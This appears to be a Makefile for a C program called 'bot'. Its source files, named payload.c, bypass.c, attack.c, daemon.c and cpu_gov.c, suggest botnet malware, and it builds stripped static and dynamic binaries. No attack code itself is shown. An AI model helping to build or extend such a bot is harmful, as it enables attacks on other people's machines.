CC      = gcc
CFLAGS  = -O3 -std=gnu11 -pthread -march=x86-64 -mtune=generic -flto -DNDEBUG -Wall
LDFLAGS = -lssl -lcrypto -lz -ldl -lpthread

SRCS = bot.c payload.c bypass.c cpu_gov.c sock_util.c ws_client.c attack.c sysinfo.c json.c daemon.c
OBJS = $(SRCS:.c=.o)

TARGET_STATIC = bot_static
TARGET_DYNAMIC = bot

.PHONY: all static dynamic clean

all: static dynamic

static: $(TARGET_STATIC)
dynamic: $(TARGET_DYNAMIC)

$(TARGET_STATIC): $(OBJS)
	$(CC) $(CFLAGS) -static -static-libgcc -static-libstdc++ $(OBJS) -o $@ $(LDFLAGS)
	strip $@

$(TARGET_DYNAMIC): $(OBJS)
	$(CC) $(CFLAGS) $(OBJS) -o $@ $(LDFLAGS)
	strip $@

%.o: %.c bot.h
	$(CC) $(CFLAGS) -c $< -o $@

clean:
	rm -f $(OBJS) $(TARGET_STATIC) $(TARGET_DYNAMIC)
